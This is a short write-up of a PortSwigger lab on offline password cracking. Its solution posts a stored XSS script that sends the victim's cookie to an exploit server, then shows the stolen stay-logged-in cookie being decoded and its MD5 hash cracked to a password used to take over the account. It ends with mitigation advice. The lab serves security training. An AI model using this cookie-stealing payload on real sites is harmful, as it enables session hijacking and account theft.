# Lab 10 — Offline password cracking

> **Expert** · [Official lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

**Entry point:** stay-logged-in cookie format (see lab 09) + stored XSS to
steal the victim's cookie.

## Solution

1. Post a comment with stored XSS:

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

2. The victim's visit hits your exploit server log:
   `stay-logged-in=carlos:26323c16d5f4dabff3bb136f2460a943`.
3. Base64-decode → `carlos:<md5>`; search the hash (offline cracking —
   hashcat in real life) → password `onceuponatime`.
4. Log in as carlos, delete his account — lab solved.

## Mitigation

HttpOnly cookies (XSS can't read them), and never store reversible or
fast-hashed passwords.
